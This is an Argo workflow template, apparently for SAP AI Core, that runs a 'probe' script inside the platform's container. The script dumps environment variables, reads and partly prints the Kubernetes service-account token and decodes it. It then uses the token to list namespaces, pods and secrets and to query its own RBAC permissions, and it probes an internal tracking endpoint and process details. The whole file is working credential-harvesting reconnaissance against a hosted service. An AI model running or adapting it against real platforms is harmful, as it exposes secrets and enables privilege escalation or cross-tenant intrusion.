apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: argo-satoken-probe
  labels:
    scenarios.ai.sap.com/id: "argo-satoken-probe-scenario"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "argo-satoken-probe-scenario"
    executables.ai.sap.com/name: "argo-satoken-probe"
    executables.ai.sap.com/description: "sa token and k8s api probe"
spec:
  entrypoint: probe
  templates:
  - name: probe
    container:
      image: python:3.11-alpine
      command: ["sh", "-c"]
      args:
      - |
        apk add -q curl 2>/dev/null
        echo "=== ENV VARS (non-predictor) ==="
        env | grep -v "_PREDICTOR_" | sort
        echo ""
        echo "=== SA TOKEN ==="
        TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
        if [ -f "$TOKEN_PATH" ]; then
          echo "SA_TOKEN_EXISTS=true"
          SA_TOK=$(cat "$TOKEN_PATH")
          echo "SA_TOKEN_HEAD=${SA_TOK:0:100}"
          echo "SA_TOKEN_LEN=${#SA_TOK}"
          # Decode the JWT header
          HEADER=$(echo "$SA_TOK" | cut -d. -f1 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); print(json.dumps(json.loads(base64.b64decode(d + '=='))))" 2>/dev/null || echo "decode_failed")
          echo "SA_TOKEN_HEADER=$HEADER"
          PAYLOAD=$(echo "$SA_TOK" | cut -d. -f2 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); print(json.dumps(json.loads(base64.b64decode(d + '=='))))" 2>/dev/null || echo "decode_failed")
          echo "SA_TOKEN_PAYLOAD=$PAYLOAD"
          echo ""
          echo "=== K8S API PROBE ==="
          K8S_HOST="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
          K8S_PORT="${KUBERNETES_SERVICE_PORT_HTTPS:-443}"
          K8S_API="https://${K8S_HOST}:${K8S_PORT}"
          echo "K8S_API=$K8S_API"
          # Self-identity
          echo "--- whoami (selfSubjectReview) ---"
          curl -sk -H "Authorization: Bearer $SA_TOK" \
            "$K8S_API/apis/authentication.k8s.io/v1/selfsubjectreviews" \
            -XPOST -H "Content-Type: application/json" \
            -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' \
            | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get('status',d), indent=2))" 2>/dev/null || echo "failed"
          # List namespaces (test cluster-wide read)
          echo "--- list namespaces ---"
          curl -sk -H "Authorization: Bearer $SA_TOK" \
            "$K8S_API/api/v1/namespaces?limit=20" \
            | python3 -c "import sys,json; d=json.load(sys.stdin); ns=[n['metadata']['name'] for n in d.get('items',[])]; print('namespaces:', ns)" 2>/dev/null || echo "failed"
          # List pods in our namespace
          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
          echo "--- our namespace ---"
          echo "NS=$NS"
          echo "--- list pods in $NS ---"
          curl -sk -H "Authorization: Bearer $SA_TOK" \
            "$K8S_API/api/v1/namespaces/$NS/pods?limit=5" \
            | python3 -c "import sys,json; d=json.load(sys.stdin); pods=[p['metadata']['name'] for p in d.get('items',[])]; print('pods:', pods[:5])" 2>/dev/null || echo "failed"
          # List secrets in our namespace
          echo "--- list secrets in $NS ---"
          curl -sk -H "Authorization: Bearer $SA_TOK" \
            "$K8S_API/api/v1/namespaces/$NS/secrets?limit=5" \
            | python3 -c "import sys,json; d=json.load(sys.stdin); sec=[s['metadata']['name'] for s in d.get('items',[])]; print('secrets:', sec[:5])" 2>/dev/null || echo "failed"
          # Check RBAC
          echo "--- can-i list ---"
          curl -sk -H "Authorization: Bearer $SA_TOK" \
            "$K8S_API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
            -XPOST -H "Content-Type: application/json" \
            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}" \
            | python3 -c "
import sys, json
d = json.load(sys.stdin)
rules = d.get('status', {})
for r in rules.get('resourceRules', [])[:15]:
    print(' ', r.get('verbs'), r.get('resources'), r.get('apiGroups'))
for r in rules.get('nonResourceRules', [])[:5]:
    print('  nonResource:', r.get('verbs'), r.get('nonResourceURLs'))
" 2>/dev/null || echo "failed"
        else
          echo "SA_TOKEN_EXISTS=false"
          ls -la /var/run/secrets/ 2>&1 || echo "no secrets dir"
        fi
        echo ""
        echo "=== TRACKING ENDPOINT ==="
        TRACK="${AICORE_TRACKING_ENDPOINT:-http://ml-tracking-service.ml-tracking.svc.cluster.local}"
        echo "endpoint=$TRACK"
        curl -sk "$TRACK/" -m5 | head -c 500 || echo "connect_failed"
        curl -sk "$TRACK/metrics" -m5 | head -c 500 || echo "no_metrics"
        echo ""
        echo "=== PROCESS INFO ==="
        cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' ; echo
        cat /proc/self/cgroup 2>/dev/null | head -5
        echo "=== DONE ==="
